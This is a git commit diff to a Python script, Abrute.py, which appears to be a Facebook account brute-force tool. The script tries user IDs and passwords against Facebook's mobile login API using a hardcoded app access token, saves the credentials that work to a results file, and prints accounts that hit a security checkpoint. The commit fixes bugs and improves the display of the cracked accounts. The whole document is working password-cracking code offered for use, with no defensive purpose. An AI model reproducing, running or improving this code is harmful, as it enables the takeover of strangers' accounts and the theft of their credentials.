4101b3b65300fa1896ecc96060bccb5bbcfd16e8
NOOBIE <44431105+KANG-NEWBIE@users.noreply.github.com>
2019-08-09 00:36:23 +0700

    Add files via upload

--- src/Abrute.py
+++ src/Abrute.py
@@ -28,15 +28,19 @@ class AutoB:
 				data={'user':idd,'pw':x}
 				re=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+data['user']+"&locale=en_US&password="+data['pw']+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 				jss=json.loads(re.text)
-				if 'access_token' in jss:
+				if 'access_token' in jss.keys():
 					self.fnd+=1
 					pen=open('result/found.txt','a')
 					pen.write(f'{idd}|{x}\n')
+					pen.close()
+					for i in open('result/found.txt','r').read().splitlines()[-1:]: print("\r\033[92m[FOUND]\033[97m %s               "%(i))
 					break
-				elif 'www.facebook.com' in jss['error_msg']:
+				elif 'User must verify their account on www.facebook.com (405)' in jss['error_msg']:
 					self.cek+=1
 					pen=open('result/cek.txt','a')
 					pen.write(f'{idd}|{x}\n')
+					pen.close()
+					for i in open('result/cek.txt','r').read().splitlines()[-1:]: print("\r\033[93m[CHECKPOINT]\033[97m %s               "%(i))
 					break
 			self.hit+=1
 			print(f'\r[CRACK] >> {self.hit}/{len(self.tar)} F[{self.fnd}] CP[{self.cek}] <<',end='')
@@ -68,10 +72,10 @@ class AutoB:
 		print()
 		p.map(self.nama,self.tar)
 		if self.fnd > 0 or self.cek > 0:
-			print("\nFound ["+str(self.fnd)+"] CheckPoint ["+str(self.cek)+"]")
+			print("\n\nFound ["+str(self.fnd)+"] CheckPoint ["+str(self.cek)+"]")
 		else: print("\n[ :( ] nothing found")
 		if self.fnd > 0:
-			print("\nFOUND:")
+			print("FOUND:")
 			print("="*30)
 			for i in open('result/found.txt','r').read().splitlines()[-+self.fnd:]: print(i)
 			print("="*30)
@@ -79,7 +83,7 @@ class AutoB:
 		if self.cek > 0:
 			print("\nCHCEKPOINT:")
 			print("="*30)
-			for i in open('result/found.txt','r').read().splitlines()[-+self.cek:]: print(i)
+			for i in open('result/cek.txt','r').read().splitlines()[-+self.cek:]: print(i)
 			print("="*30)
 			print("check result saved: result/cek.txt")
 try:
